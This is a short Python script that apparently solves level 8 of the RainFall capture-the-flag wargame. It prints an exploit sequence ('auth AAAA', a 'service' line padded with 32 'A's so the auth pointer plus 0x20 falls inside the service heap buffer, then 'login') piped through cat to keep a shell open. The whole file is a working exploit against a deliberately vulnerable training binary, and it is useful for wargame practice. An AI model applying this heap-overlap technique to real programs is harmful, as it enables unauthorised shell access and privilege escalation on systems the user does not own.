#!/usr/bin/env python3
"""Level8: output the exploit sequence (auth / service padding / login). No binary addresses."""

# Number of 'A' after "service " so that auth+0x20 falls inside the service buffer (strdup).
# RainFall: 32 works. Try 21 or 40 if needed.
SERVICE_PAD = 32

def main():
    service_str = "A" * SERVICE_PAD
    cmd_interactive = (
        "./level8\n"
        "auth AAAA\n"
        f"service {service_str}\n"
        "login\n"
    )
    cmd_pipe = (
        f'( printf \'auth AAAA\\nservice {service_str}\\nlogin\\n\'; cat ) | ./level8'
    )
    print("# Interactive: run ./level8 then type the three lines.")
    print("# Pipe (keeps stdin open for shell):")
    print(cmd_pipe)
    print("# SERVICE_PAD =", SERVICE_PAD)

if __name__ == "__main__":
    main()
